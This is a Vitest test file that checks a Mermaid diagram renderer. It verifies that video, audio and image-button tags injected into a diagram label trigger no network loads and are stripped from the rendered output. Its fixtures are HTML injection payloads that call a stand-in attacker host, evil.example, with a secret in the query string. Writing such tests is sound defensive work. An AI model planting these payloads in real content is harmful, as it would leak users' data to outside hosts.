// @vitest-environment jsdom
import { expect, test } from 'vitest'

const matrix = () => ({ a: 1, b: 0, c: 0, d: 1, e: 0, f: 0 })
Object.assign(SVGElement.prototype, {
  getBBox: () => ({ x: 0, y: 0, width: 10, height: 10 }),
  getComputedTextLength: () => 10,
  createSVGMatrix: matrix,
  getScreenCTM: matrix,
})
const loading: string[] = []
new MutationObserver((records) => {
  for (const record of records) {
    for (const node of record.addedNodes) {
      if (!(node instanceof Element)) continue
      for (const one of [node, ...node.querySelectorAll('video, audio, input')]) {
        const address = one.getAttribute('src')
        if (address) loading.push(`${one.localName} ${address}`)
      }
    }
  }
}).observe(document, { childList: true, subtree: true })
const { drawDiagram } = await import('./diagrams')
const answer = (code: string) => drawDiagram(code, 'mermaid', 'light', 'document', false)
const labels = {
  video: `<video src='https://evil.example/v.mp4?secret=42'></video>`,
  audio: `<audio src='https://evil.example/a.mp3?secret=42'></audio>`,
  'image button': `<input type='image' src='https://evil.example/i.png?secret=42'>`,
}
for (const [name, label] of Object.entries(labels)) {
  test(`a ${name} in an answer diagram label loads nothing while drawn`, async () => {
    loading.length = 0
    await answer(`flowchart LR\n  A["${label}"] --> B`)
    await new Promise((settle) => setTimeout(settle, 0))
    expect(loading.filter((one) => one.includes('evil.example'))).toEqual([])
  })
  test(`a ${name} in an answer diagram label is not kept in the drawing`, async () => {
    expect(await answer(`flowchart LR\n  A["${label}"] --> B`)).not.toContain('evil.example')
  })
}
